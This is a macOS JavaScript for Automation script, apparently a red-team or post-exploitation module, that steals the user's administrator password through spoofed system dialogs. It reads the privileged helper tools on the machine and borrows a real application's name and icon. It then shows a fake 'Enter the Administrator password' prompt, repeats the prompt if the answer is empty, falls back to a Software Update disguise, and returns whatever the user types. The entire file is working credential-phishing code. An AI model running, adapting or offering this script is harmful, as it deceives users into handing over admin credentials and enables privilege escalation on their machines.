ObjC.import('Foundation')
ObjC.import('AppKit')
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

function PrivHelpToolSpoof(){

function listDirectory(strPath) {
		var fm = $.NSFileManager.defaultManager;
        return ObjC.unwrap(
                fm.contentsOfDirectoryAtPathError($(strPath)
                    .stringByExpandingTildeInPath, null))
            .map(ObjC.unwrap);
    }
var output = "";

var PrivilegedHelperExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPath('/Library/PrivilegedHelperTools')
				 if (PrivilegedHelperExistsCheck == true) {
var enumerateFolderContents = listDirectory('/Library/PrivilegedHelperTools')



function stoperror() {
   return true;
}
var fullPaths = []
for (var key in enumerateFolderContents) {
	 try{
	 var parentHelper = currentApp.doShellScript("launchctl plist __TEXT,__info_plist " + " " + '/Library/PrivilegedHelperTools/' + enumerateFolderContents[key] + " " + "| grep -A1 AuthorizedClients")
	 var formatPaths = parentHelper.split('identifier')[1].split('and')[0]
	 }catch(e){stoperror(e)}

	 fullPaths += formatPaths + "\n";
 }

var fixedFileOutput = fullPaths.replace(/,/gi, "\n");
var splitFileOutput = fixedFileOutput.split("\n")
 var cleanFullPaths = [];
 for (var i = 0; i < splitFileOutput.length; i++) {
     if (splitFileOutput[i] != "undefined") {
         cleanFullPaths.push(splitFileOutput[i]);
     }
 }

var defaultIconName = "AppIcon"
var defaultIconStr = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns"
var resourcesFolder = "/Contents/Resources"
var iconExt = ".icns"
var makeChanges = " wants to make changes."
var privString = "Enter the Administrator password for "
var allowThis = " to allow this."
var userName = currentApp.systemInfo().shortUserName;
var hlprName = cleanFullPaths[0].replace(/['"]+/g, '').trim()
var text = hlprName + makeChanges + "\n" + privString + userName + allowThis
var title = $.NSWorkspace.sharedWorkspace.URLForApplicationWithBundleIdentifier(hlprName).fileSystemRepresentation + '';
var wonkyApp = title.toString()
if (wonkyApp == "undefined" ){
	var iconNameString = "noicon"
	var appName = "Application is Unable to Continue" + "\n" + "Please Close the Application" 
	}else {
var appName = title.split('/').slice(-1)

var iconFolder = title + "/Contents/Resources/"
var enumerateIconfolder = listDirectory(iconFolder) 
var iconName =
enumerateIconfolder.filter(function(file){
   return file.indexOf(iconExt) !== -1;
	
});

var iconNameString = iconName.toString()
} 
if (iconNameString.includes('icns') == true ){
	var icon = iconFolder + iconName[0]
} else {var icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns"
}

var prompt = currentApp.displayDialog(text, {
	defaultAnswer: "",
	buttons: ['OK', 'Cancel'],
	defaultButton: 'OK',
	cancelButton: 'Cancel',
	withTitle: appName,
	withIcon: Path(icon),
	hiddenAnswer: true
}); 

var promptResults = prompt.textReturned
if (promptResults == ""){
	var textagain = appName + " is Unable to Continue" + "\n" + "Please Close the Application or " + privString + userName
	var promptagain = currentApp.displayDialog(textagain, {
		defaultAnswer: "",
		buttons: ['OK', 'Cancel'],
		defaultButton: 'OK',
		cancelButton: 'Cancel',
		withTitle: appName,
		withIcon: Path(icon),
		hiddenAnswer: true
	});
	var promptResultsRound2 = promptagain.textReturned
	output += "**************************************\n" + "**** Contents of the Prompt Entry ****\n" + "**************************************\n" + promptResultsRound2 + "\n"
} else {
	output += "**************************************\n" + "**** Contents of the Prompt Entry ****\n" + "**************************************\n" + promptResults + "\n"
	}

} else {
var config = [];
var icon = "/System/Library/PreferencePanes/SoftwareUpdate.prefPane/Contents/Resources/SoftwareUpdate.icns";
    var title = "An Application Needs an Update to Continue";
    var text = "An Application Needs an Update to Continue";

		var promptClassic = currentApp.displayDialog(text, {
			defaultAnswer: "",
			buttons: ['OK', 'Cancel'],
			defaultButton: 'OK',
			cancelButton: 'Cancel',
			withTitle: title,
			withIcon: Path(icon),
			hiddenAnswer: true
    });
   
    var promptResultsclassic = promptClassic.textReturned
   output += "**************************************\n" + "**** Contents of the Prompt Entry ****\n" + "**************************************\n" + promptResultsclassic + "\n"

}
return output
}
